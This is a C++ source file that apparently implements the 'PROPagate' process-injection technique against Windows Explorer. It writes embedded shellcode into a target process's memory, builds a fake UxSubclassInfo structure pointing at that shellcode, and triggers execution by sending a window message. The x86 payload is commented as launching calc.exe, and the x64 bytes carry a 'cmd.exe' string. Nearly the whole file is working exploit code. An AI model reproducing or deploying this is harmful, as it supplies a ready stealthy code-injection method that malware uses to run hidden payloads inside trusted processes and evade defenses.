#include "windows.h"
#include "tlhelp32.h"
#include "WinCred.h"
#include "iostream"
#include "stdio.h"
#include "fstream"
#include "Wincrypt.h"
#include <cstdlib>
#include <stdio.h>
#include <strsafe.h>
#include <shlwapi.h>
#include "string.h"
#include <vector>
#pragma comment(lib, "Vfw32.lib")
#pragma comment(lib, "shlwapi.lib")
using namespace std;

#define STATUS_SUCCESS 1
#define STATUS_FAIL -1

//source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680582(v=vs.85).aspx
void ErrorExit(PCWSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPWSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

DWORD FindPIDByName(LPWSTR pName)
{
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}
	if (Process32First(snapshot, &pEntry) == TRUE)
	{
		while (Process32Next(snapshot, &pEntry) == TRUE)
		{
			if (NULL != wcsstr(pEntry.szExeFile, pName))
			{
				return pEntry.th32ProcessID;
			}
		}
		ErrorExit(TEXT("Process32Next"));
	}
	else
	{
		ErrorExit(TEXT("Process32First"));
	}

	CloseHandle(snapshot);
	return 0;
}

int GetFunctionAddressFromDll(PSTR pszDllName, PSTR pszFunctionName, PVOID *ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		ErrorExit(TEXT("GetModuleHandleA"));
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		ErrorExit(TEXT("GetProcAddress"));
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return STATUS_SUCCESS;
}

bool IsWow64()
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL(APIENTRY *LPFN_ISWOW64PROCESS)
		(HANDLE, PBOOL);

	LPFN_ISWOW64PROCESS fnIsWow64Process;

	HMODULE module = GetModuleHandleA("kernel32");
	const char funcName[] = "IsWow64Process";
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)
		GetProcAddress(module, funcName);

	if (NULL != fnIsWow64Process)
	{
		fnIsWow64Process(GetCurrentProcess(), &bIsWow64);

	}
	return bIsWow64;
}

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{

	if (argc != 2)
	{
		printf("Usage: propagate.exe [process name]\n");
		return 1;
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);


	unsigned char sc_x64[] =

		"\x49\x89\xC4\x49\x89\xDD\x49\x89\xCE\x49\x89\xD7" 		//		mov r12, rax; 		mov r13, rbx; 		mov r14, rcx; 		mov r15, rdx
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x2e\x65\x78\x65\x00"
		"\x90\x90\x90\x90\x90\x90\x90"
		"\x4C\x89\xE0\x4C\x89\xEB\x4C\x89\xF1\x4C\x89\xFA"
		"\x48\x83\xc4\x40" //add esp,40
		"\xc2\x28\x00"; //ret 0x28

	unsigned char sc_x86[] =
		"\x60" //pushad
		"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" // run calc.exe shellcode
		"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
		"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
		"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
		"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
		"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
		"\x45\x81\x3e\x43\x72\x65\x61\x75"
		"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
		"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
		"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
		"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
		"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
		"\x6c\x63\x89\xe2\x52\x52\x53\x53"
		"\x53\x53\x53\x53\x52\x53\xff\xd7"
		"\x81\xC4\x00\x04\x00\x00" //add esp,400
		"\x61" //popad
		"\xC2\x12\x00"; //ret 0x12

	int x64_offset = 0;
	if (IsWow64())
	{
		printf("[+] Running on Windows x64 under WOW64\n");
		x64_offset = 4; //the subclass procedure is at offset 0x18 compared to 0x14 on x86
	}
	else
	{
		printf("[+] Running on a Windows x86\n");
	}

	/* Get Handle to process */

	printf("[*] Opening process\n");
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("[-] Couldn't open process, exiting...\n");
		return -1;
	}
	else
	{
		printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);
	}

	/* Allocate memory in target process */
	printf("[*] Allocating memory in process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}

	printf("[+] Memory allocated at: 0x%Ix\n", (SIZE_T)lpBaseAddress);

	SIZE_T *lpNumberOfBytesWritten = 0;
	printf("[*] Writing shellcode to process\n");

	BOOL resWPM;
	if (IsWow64())
	{
		resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc_x64, sizeof(sc_x64), lpNumberOfBytesWritten);
	}
	else
	{
		resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc_x86, sizeof(sc_x86), lpNumberOfBytesWritten);
	}
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}

	printf("[+] Shellcode is written to memory\n");

	/* Locate window */

	printf("[*] Locating window\n");
	HWND hwnd_other = FindWindowEx(NULL, NULL, L"Shell_TrayWnd", NULL);
	if (hwnd_other == NULL)
	{
		ErrorExit(TEXT("FindWindowEx"));
	}

	printf("[*] Locating sub window\n");
	HWND subwin = GetDlgItem(hwnd_other, 303);
	if (subwin == NULL)
	{
		ErrorExit(TEXT("GetDlgItem"));
	}
	printf("[*] Locating dialog item\n");

	HWND control = GetDlgItem(subwin, 1504);
	if (control == NULL)
	{
		ErrorExit(TEXT("GetDlgItem"));
	}

	/* Red current subclass structure */

	char fake_subclass[0x50];

	HANDLE hFake = (HANDLE)((SIZE_T)lpBaseAddress + 0x3e0); //target memory address for fake subclass structure

	HANDLE hOrig = GetProp(control, L"UxSubclassInfo"); //handle is the memory address of the current subclass structure

	BOOL resRPM = ReadProcessMemory(hProcess, (LPCVOID)hOrig, (LPVOID)fake_subclass, 0x50, NULL);
	if (!resRPM)
	{
		ErrorExit(TEXT("ReadProcessMemory"));
	}

	printf("[+] Current subclass structure was read to memory\n");

	/* Update subclass with fake function pointer */
	SIZE_T i = (SIZE_T)lpBaseAddress;
	BYTE first = (i >> 24) & 0xff;
	BYTE second = (i >> 16) & 0xff;
	BYTE third = (i >> 8) & 0xff;
	BYTE fourth = i & 0xff;

	fake_subclass[0x14 + x64_offset] = fourth;
	fake_subclass[0x15 + x64_offset] = third;
	fake_subclass[0x16 + x64_offset] = second;
	fake_subclass[0x17 + x64_offset] = first;
	if (IsWow64())
	{
		fake_subclass[0x18 + x64_offset] = 0;
		fake_subclass[0x19 + x64_offset] = 0;
		fake_subclass[0x20 + x64_offset] = 0;
		fake_subclass[0x21 + x64_offset] = 0;
	}
	printf("[*] Writing fake subclass to process\n");
	resWPM = WriteProcessMemory(hProcess, (LPVOID)((SIZE_T)lpBaseAddress + 0x3e0), (LPVOID)fake_subclass, 0x50, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));

	}

	printf("[+] Fake subclass structure is written to memory\n");
	printf("[+] Press enter to unhook the function and exit\r\n");
	getchar();

	//SetProp(control, "CC32SubclassInfo", h);
	printf("[*] Setting fake SubClass property\n");
	SetProp(control, L"UxSubclassInfo", hFake);
	printf("[*] Triggering shellcode....!!!\n");
	SendMessage(control, WM_KEYDOWN, VK_NUMPAD1, 0);


	printf("[+] Restoring subclass header.\n");
	SetProp(control, L"UxSubclassInfo", hOrig);
	return 0;
}
